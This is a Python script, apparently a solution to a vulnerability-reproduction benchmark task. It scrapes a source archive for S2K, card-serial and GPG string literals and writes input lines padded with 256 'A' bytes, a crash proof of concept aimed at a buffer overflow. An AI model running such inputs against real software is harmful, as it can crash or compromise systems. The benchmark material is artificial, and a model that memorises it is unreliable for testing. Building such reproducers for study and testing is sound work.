import tarfile
import re
import codecs


class Solution:
    def solve(self, src_path: str) -> bytes:
        keywords = ['S2K', 's2k', 'S2k', 'serial', 'Serial', 'SERIAL',
                    'card', 'Card', 'CARD', 'gpg', 'GPG', 'Gpg']
        candidate_strings = []

        # Extract relevant C/C++ header/source files and collect string literals
        try:
            with tarfile.open(src_path, 'r:*') as tf:
                for member in tf.getmembers():
                    if not member.isfile():
                        continue
                    name = member.name.lower()
                    if not any(name.endswith(ext) for ext in ('.c', '.h', '.cc', '.cpp', '.cxx', '.hpp', '.hh')):
                        continue
                    f = tf.extractfile(member)
                    if not f:
                        continue
                    try:
                        data = f.read().decode('utf-8', 'ignore')
                    except Exception:
                        continue

                    # Find C string literals
                    for m in re.finditer(r'"((?:[^"\\]|\\.)*)"', data):
                        s = m.group(1)
                        if any(k in s for k in keywords):
                            candidate_strings.append(s)
        except Exception:
            candidate_strings = []

        # Deduplicate while preserving order
        seen = set()
        unique = []
        for s in candidate_strings:
            if s not in seen:
                seen.add(s)
                unique.append(s)
        candidate_strings = unique

        def process_literal(lit: str) -> str:
            # Decode common C escape sequences
            try:
                decoded = codecs.decode(lit, 'unicode_escape')
            except Exception:
                decoded = lit
            return decoded

        def score_string(s: str) -> float:
            s_lower = s.lower()
            score = 0.0
            if 's2k' in s_lower:
                score += 4.0
            if 'card' in s_lower:
                score += 2.0
            if 'serial' in s_lower:
                score += 2.0
            if 'gpg' in s_lower:
                score += 1.0
            # Prefer shorter strings (likely command keywords)
            score -= 0.01 * len(s)
            return score

        long_serial = 'A' * 256
        lines = []

        if candidate_strings:
            # Rank and select top few candidate strings
            candidate_strings.sort(key=score_string, reverse=True)
            max_candidates = 5
            selected = candidate_strings[:max_candidates]

            for s in selected:
                base = process_literal(s)
                # Remove format specifiers to get bare text
                base2 = re.sub(r'%[-+0-9.#]*[a-zA-Z]', '', base)
                # Use only first line if there are embedded newlines
                base2 = base2.splitlines()[0].strip()
                if not base2:
                    continue
                # Skip if contains control chars other than whitespace
                if any(ord(ch) < 0x20 and ch not in '\t\r\n' for ch in base2):
                    continue
                # Generate variants with different separators
                for sep in [' ', ':', '=']:
                    lines.append(base2 + sep + long_serial)
        else:
            # Fallback generic patterns if nothing useful was found
            prefixes = [
                'S2K_CARD_SERIAL',
                'S2K SERIAL',
                'CARD SERIAL',
                'GPG S2K CARD SERIAL',
                'SERIAL'
            ]
            for prefix in prefixes:
                for sep in [' ', ':', '=']:
                    lines.append(prefix + sep + long_serial)

        if not lines:
            # Last resort fallback: just a large buffer
            return b'A' * 1024

        poc_str = '\n'.join(lines) + '\n'
        return poc_str.encode('utf-8', 'ignore')
